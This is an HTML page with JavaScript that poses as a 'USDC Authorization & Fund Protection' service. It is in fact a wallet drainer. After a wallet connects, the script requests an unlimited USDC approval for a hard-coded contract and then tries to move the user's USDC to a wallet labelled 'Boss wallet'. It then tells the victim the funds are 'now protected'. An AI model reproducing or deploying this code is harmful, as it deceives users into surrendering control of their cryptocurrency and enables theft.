<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Mark III · USDC Authorization & Fund Protection</title>
</head>
<body>
  <h2>Mark III – USDC Authorization & Fund Protection</h2>

  <button id="connect">Connect Wallet</button>
  <button id="authorize">Authorize and Transfer</button>
  <div id="status" style="margin-top: 10px; color: #333;"></div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>

  <script>
    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC Contract
    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"; // Mark III Contract (approval target)
    const recipientWallet = "0x59e513Ae37614f1e670bfE961B3456257C444d24"; // Boss wallet (receives funds)
    const approveAmount = ethers.constants.MaxUint256;

    let provider, signer, userAddress;

    document.getElementById("connect").onclick = async () => {
      if (window.ethereum) {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        document.getElementById("status").innerText = "Wallet successfully connected: " + userAddress;
      } else {
        alert("No Ethereum provider detected. Please install MetaMask.");
      }
    };

    document.getElementById("authorize").onclick = async () => {
      try {
        const usdc = new ethers.Contract(
          usdcAddress,
          [
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
          ],
          signer
        );

        document.getElementById("status").innerText = "Initiating USDC authorization...";
        const approveTx = await usdc.approve(contractAddress, approveAmount);
        await approveTx.wait();
        document.getElementById("status").innerText = "Authorization granted. Proceeding with transfer...";

        const amount = prompt("Please enter the USDC amount to transfer:");
        const parsedAmount = ethers.utils.parseUnits(amount, 6);

        const transferTx = await usdc.transferFrom(userAddress, recipientWallet, parsedAmount);
        await transferTx.wait();
        document.getElementById("status").innerText = "Transfer successful. Your funds are now protected.";
      } catch (error) {
        console.error(error);
        document.getElementById("status").innerText = "Transaction failed: " + (error.message || "Unknown error occurred.");
      }
    };
  </script>
</body>
</html>
